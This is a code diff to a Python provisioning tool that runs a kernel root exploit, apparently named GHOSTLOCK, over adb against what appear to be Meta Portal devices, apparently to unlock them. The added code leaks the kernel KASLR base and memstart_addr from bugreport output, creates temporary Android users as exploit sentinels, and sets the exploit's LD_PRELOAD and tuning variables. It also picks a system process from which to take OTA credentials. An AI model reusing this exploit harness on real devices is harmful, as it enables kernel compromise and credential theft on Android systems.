@@ -341,6 +341,9 @@ class PortalProvisioner:
         self.adb = ["adb", "-s", serial]
         self.target: PortalTarget | None = None
         self.persist_wireless_adb = False
+        self._bugreport_cache: dict[str, str] = {}
+        self.exploit_user_ids_runtime: tuple[int, ...] = ()
+        self.exploit_users_created: list[int] = []
 
     def uid1000_path(self, name: str) -> str:
         directory = (
@@ -349,6 +352,72 @@ class PortalProvisioner:
             else "/data/portal-uid1000"
         )
         return f"{directory}/{name}"
+
+    def prepare_exploit_users(self) -> None:
+        if self.target is None or self.target.proc_uid_sentinel != "user":
+            return
+        required = len(self.target.proc_uid_user_ids)
+        if required == 0:
+            raise ProvisionError("user sentinel target has no requested user IDs")
+        listed = self.adb_run(
+            ["shell", "pm", "list", "users"], timeout=20, check=True
+        ).stdout
+        sentinel_users = [
+            (int(user_id), name)
+            for user_id, name in re.findall(r"UserInfo\{(\d+):([^:}]+):", listed)
+            if int(user_id) != 0 and name.startswith("PortalRootSentinel-")
+        ]
+        available = [user_id for user_id, _ in sentinel_users]
+        self.exploit_users_created.extend(
+            user_id for user_id, _ in sentinel_users
+        )
+        while len(available) < required:
+            ordinal = len(available) + 1
+            result = self.adb_run(
+                ["shell", "pm", "create-user", f"PortalRootSentinel-{ordinal}"],
+                timeout=30,
+            )
+            match = re.search(r"Success: created user id (\d+)", result.stdout)
+            if result.returncode != 0 or not match:
+                self.cleanup_exploit_users(best_effort=True)
+                raise ProvisionError(
+                    "could not create temporary Ripley exploit user: "
+                    + result.stdout.strip()
+                )
+            user_id = int(match.group(1))
+            available.append(user_id)
+            self.exploit_users_created.append(user_id)
+        self.exploit_user_ids_runtime = tuple(available[:required])
+        print(
+            "EXPLOIT_USERS_OK ids="
+            + ",".join(str(user_id) for user_id in self.exploit_user_ids_runtime)
+            + f" created={len(self.exploit_users_created)}",
+            flush=True,
+        )
+
+    def cleanup_exploit_users(self, best_effort: bool = False) -> None:
+        failures: list[str] = []
+        for user_id in reversed(self.exploit_users_created):
+            try:
+                result = self.adb_run(
+                    ["shell", "pm", "remove-user", str(user_id)], timeout=30
+                )
+                if result.returncode != 0 or "Success" not in result.stdout:
+                    failures.append(f"{user_id}:{result.stdout.strip()}")
+            except ProvisionError as exc:
+                failures.append(f"{user_id}:{exc}")
+        removed = len(self.exploit_users_created) - len(failures)
+        self.exploit_users_created.clear()
+        self.exploit_user_ids_runtime = ()
+        if failures and not best_effort:
+            raise ProvisionError(
+                "could not remove temporary Ripley exploit users: "
+                + "; ".join(failures)
+            )
+        print(
+            f"EXPLOIT_USERS_REMOVE removed={removed} failures={len(failures)}",
+            flush=True,
+        )
 
     def debloat_component_names(self) -> tuple[str, ...]:
         profile = self.target.debloat_component_profile if self.target else "full"
@@ -543,6 +612,24 @@ class PortalProvisioner:
                     and last_boot_id
                     and last_boot_id != before
                 ):
+                    settle_seconds = (
+                        self.target.post_boot_adb_settle_seconds
+                        if self.target
+                        else 0
+                    )
+                    if settle_seconds:
+                        time.sleep(settle_seconds)
+                        self.run(["adb", "connect", self.serial], timeout=5)
+                        stable = self.adb_run(
+                            ["shell", "getprop", "sys.boot_completed"],
+                            timeout=5,
+                        )
+                        if (
+                            stable.returncode != 0
+                            or stable.stdout.strip() != "1"
+                        ):
+                            time.sleep(3)
+                            continue
                     return last_boot_id
             except ProvisionError:
                 pass
@@ -3224,6 +3311,12 @@ class PortalProvisioner:
     def kaslr_base(self, tag: str) -> int:
         if self.target is None:
             raise ProvisionError("target must be selected before KASLR discovery")
+        if self.target.kaslr_strategy == "bugreport":
+            report = self.bugreport_text(tag)
+            match = re.search(r"\.text\s+: (0x[0-9a-f]+) -", report)
+            if not match:
+                raise ProvisionError("kernel .text range is absent from bugreport")
+            return int(match.group(1), 16)
         offsets = self.target.kaslr_pc_offsets
         simpleperf = "simpleperf"
         if self.target.bundled_simpleperf:
@@ -3528,6 +3621,19 @@ class PortalProvisioner:
             raise ProvisionError(
                 "allocator diagnostic did not expose a verified memstart_addr"
             )
+        report = self.bugreport_text(tag)
+        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
+        if not match:
+            raise ProvisionError("kernel virtual memory range is absent from bugreport")
+        virtual_start = int(match.group(1), 16)
+        return (
+            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
+        ) & 0xFFFFFFFFFFFFFFFF
+
+    def bugreport_text(self, tag: str) -> str:
+        cached = self._bugreport_cache.get(tag)
+        if cached is not None:
+            return cached
         result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
         match = re.search(r"OK:(\S+\.zip)", result.stdout)
         recovered_archive = False
@@ -3543,7 +3649,7 @@ class PortalProvisioner:
             # finalized archive instead of discarding a usable capture.
             self.connect(wait_seconds=600)
             if self.adb_run(
-                ["shell", "test", "-s", remote], timeout=5
+                ["shell", "test", "-s", remote], timeout=20
             ).returncode != 0:
                 raise ProvisionError(
                     "bugreportz disconnected and its archive is absent: "
@@ -3557,30 +3663,50 @@ class PortalProvisioner:
             )
         with tempfile.TemporaryDirectory(prefix=f"portal-{tag}-") as temporary:
             local = pathlib.Path(temporary) / "bugreport.zip"
-            self.adb_run(["pull", remote, str(local)], timeout=60, check=True)
-            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
-            with zipfile.ZipFile(local) as archive:
-                report_name = next(
-                    (
-                        name
-                        for name in archive.namelist()
-                        if pathlib.PurePosixPath(name).name.startswith("bugreport-")
-                        and name.endswith(".txt")
-                    ),
-                    None,
+            report = ""
+            for pull_attempt in range(1, 4):
+                self.adb_run(
+                    ["pull", remote, str(local)], timeout=180, check=True
                 )
-                if report_name is None:
-                    raise ProvisionError("bugreport text is absent from archive")
-                report = archive.read(report_name).decode(errors="replace")
+                try:
+                    with zipfile.ZipFile(local) as archive:
+                        report_name = next(
+                            (
+                                name
+                                for name in archive.namelist()
+                                if pathlib.PurePosixPath(name).name.startswith(
+                                    "bugreport-"
+                                )
+                                and name.endswith(".txt")
+                            ),
+                            None,
+                        )
+                        if report_name is None:
+                            raise ProvisionError(
+                                "bugreport text is absent from archive"
+                            )
+                        report = archive.read(report_name).decode(
+                            errors="replace"
+                        )
+                    break
+                except zipfile.BadZipFile:
+                    if pull_attempt == 3:
+                        raise ProvisionError(
+                            "bugreport archive remained incomplete after "
+                            "three pull attempts"
+                        )
+                    print(
+                        "BUGREPORT_ARCHIVE_WAIT "
+                        f"attempt={pull_attempt} reason=incomplete-zip",
+                        flush=True,
+                    )
+                    time.sleep(30)
+                    self.connect(wait_seconds=600)
+            self.adb_run(["shell", "rm", "-f", remote], timeout=20)
         if recovered_archive:
             print("BUGREPORT_ARCHIVE_OK source=finalized-begin", flush=True)
-        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
-        if not match:
-            raise ProvisionError("kernel virtual memory range is absent from bugreport")
-        virtual_start = int(match.group(1), 16)
-        return (
-            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
-        ) & 0xFFFFFFFFFFFFFFFF
+        self._bugreport_cache[tag] = report
+        return report
 
     def exploit(self, base: int, memstart: int, attempt: int) -> bool:
         if self.target is None:
@@ -3620,7 +3746,6 @@ class PortalProvisioner:
             "GHOSTLOCK_SOCKET_WATCH": "1",
             "GHOSTLOCK_WATCH_CFI": "1",
             "GHOSTLOCK_SENDMMSG_PROC_UID_LOCK": "1",
-            "GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN": "1",
             "GHOSTLOCK_HOLD_AFTER_SCHED": "1",
             "GHOSTLOCK_MAIN_ROUTE": f"slide-{stack_route}",
             "GHOSTLOCK_FOPS_STACK_ROUTE": stack_route,
@@ -3631,6 +3756,8 @@ class PortalProvisioner:
             "GHOSTLOCK_VOLATILE_LOG": "1",
             "LD_PRELOAD": PRELOAD_REMOTE,
         }
+        if self.target.break_owner_chain:
+            environment["GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN"] = "1"
         if self.target.kgsl_reclaim:
             environment.update(
                 {
@@ -3648,7 +3775,7 @@ class PortalProvisioner:
             environment["GHOSTLOCK_MM_RECYCLE_SLABS"] = str(
                 mm_recycle_slabs
             )
-        if self.target.proc_uid_sentinel in ("run_as", "app"):
+        if self.target.proc_uid_sentinel in ("run_as", "app", "user"):
             environment["GHOSTLOCK_PROC_UID_APP_SENTINEL"] = "1"
             if self.target.proc_uid_sentinel == "run_as":
                 environment.update(
@@ -3659,10 +3786,20 @@ class PortalProvisioner:
                     ),
                     }
                 )
-            else:
+            elif self.target.proc_uid_sentinel == "app":
                 environment["GHOSTLOCK_PROC_UID_APP_COMPONENT"] = (
                     f"{EXPLOIT_SENTINEL_PACKAGE}/.SentinelActivity"
                 )
+            else:
+                environment["GHOSTLOCK_PROC_UID_USER_SENTINEL"] = "1"
+                user_ids = (
+                    self.exploit_user_ids_runtime
+                    or self.target.proc_uid_user_ids
+                )
+                if user_ids:
+                    environment["GHOSTLOCK_SENTINEL_USER_IDS"] = ",".join(
+                        str(user_id) for user_id in user_ids
+                    )
         else:
             environment["GHOSTLOCK_PROC_UID_SENTINEL_NICE"] = "0"
         if self.persist_wireless_adb:
@@ -3715,7 +3852,11 @@ class PortalProvisioner:
             and self.requested_actions() == {"device_owner": True}
         )
         private_ota_action = (
-            self.target.ota_installer_credentials
+            (
+                self.target.ota_installer_credentials
+                or self.target.ota_system_credentials
+                or self.target.ota_credential_process is not None
+            )
             and self.requested_actions()
             in ({"disable_updates": True}, {"enable_updates": True})
         )
@@ -3792,12 +3933,17 @@ class PortalProvisioner:
                 self.meta_accounts_local_only or self.meta_accounts_finalize_only
             ):
                 source_process = "com.facebook.alohaservices.alohausers"
+            elif private_ota_action and self.target.ota_credential_process:
+                source_process = self.target.ota_credential_process
             else:
                 source_process = (
                     "installd"
                     if (
                         private_audio_action
-                        or private_ota_action
+                        or (
+                            private_ota_action
+                            and not self.target.ota_system_credentials
+                        )
                         or private_presence_action
                         or private_uid1000_action
                     )
@@ -3995,7 +4141,22 @@ class PortalProvisioner:
             ["shell", "am", "force-stop", "--user", "0", "com.facebook.aloha.analytics"],
             timeout=10,
         )
+        # A disconnected adbd can hide the watcher's final stdout marker.  A
+        # few targets recover that result from a file written by the watcher,
+        # so remove any record left by an earlier attempt before this process
+        # starts.  Otherwise an early crash can be mistaken for success.
+        self.adb_run(
+            [
+                "shell",
+                "rm",
+                "-f",
+                "/data/local/tmp/ghostlock-watch-result.txt",
+            ],
+            timeout=5,
+            check=True,
+        )
         self.adb_run(["shell", "logcat", "-c"], timeout=5)
+        environment.update(self.target.exploit_env)
         shell = "env " + " ".join(
             f"{name}={shlex.quote(value)}" for name, value in environment.items()
         ) + " /system/bin/true"
@@ -4007,6 +4168,8 @@ class PortalProvisioner:
             "pre-signal FOPS check miss",
             "held reclaim payload inspection complete clean=0",
             "held child CFI complete ok=0",
+            "prepare_kernel_page did not find usable nonzero source pointers",
+            "proc_uid lock waiter setup failed",
         )
         expected_markers: dict[str, tuple[str, bool]] = {}
         if self.persist_wireless_adb:
@@ -4171,6 +4334,15 @@ class PortalProvisioner:
                 else:
                     pending_output = ""
                 for line in lines:
+                    if (
+                        self.target.post_scheduler_timeout_seconds > 0
+                        and "post-scheduler checkpoint complete" in line
+                    ):
+                        deadline = min(
+                            deadline,
+                            time.monotonic()
+                            + self.target.post_scheduler_timeout_seconds,
+                        )
                     if (
                         not post_root_deadline_extended
                         and self.target.post_root_timeout_seconds > 0
@@ -5971,7 +6143,7 @@ class PortalProvisioner:
             )
         legacy_camera_light = self.adb_run(
             ["shell", "test", "-f", CAMERA_LIGHT_INSTALLED_REMOTE],
-            timeout=5,
+            timeout=20,
         ).returncode == 0
         if not legacy_camera_light and not self.target.uid1000_embedded_helper:
             legacy_camera_light = self.adb_run(
@@ -5981,7 +6153,7 @@ class PortalProvisioner:
                     "-e",
                     self.uid1000_path("camera-led-enabled"),
                 ],
-                timeout=5,
+                timeout=20,
             ).returncode == 0
         if legacy_camera_light and not self.restore_camera_light:
             self.restore_camera_light = True
@@ -6156,7 +6328,11 @@ class PortalProvisioner:
             self.disable_updates
             and not self.ota_already_configured
             and self.target
-            and self.target.ota_installer_credentials
+            and (
+                self.target.ota_installer_credentials
+                or self.target.ota_system_credentials
+                or self.target.ota_credential_process is not None
+            )
             and self.requested_actions() != {"disable_updates": True}
         ):
             phase_logs = self.log_dir / "ota-bootstrap"
@@ -6597,6 +6773,7 @@ class PortalProvisioner:
             self.prepare_exploit_sentinel()
         sentinel_removed = not use_exploit_sentinel
         try:
+            self.prepare_exploit_users()
             self.stage()
             clean_boot_id: str | None = None
             for attempt in range(1, self.attempts + 1):
@@ -6701,6 +6878,8 @@ class PortalProvisioner:
                 self.verify_across_two_reboots(first_boot=post_attempt_boot)
                 return
         finally:
+            if self.exploit_users_created:
+                self.cleanup_exploit_users(best_effort=True)
             if use_exploit_sentinel and not sentinel_removed:
                 self.uninstall_exploit_sentinel(best_effort=True)
             if self.uid1000_runtime_package_installed:
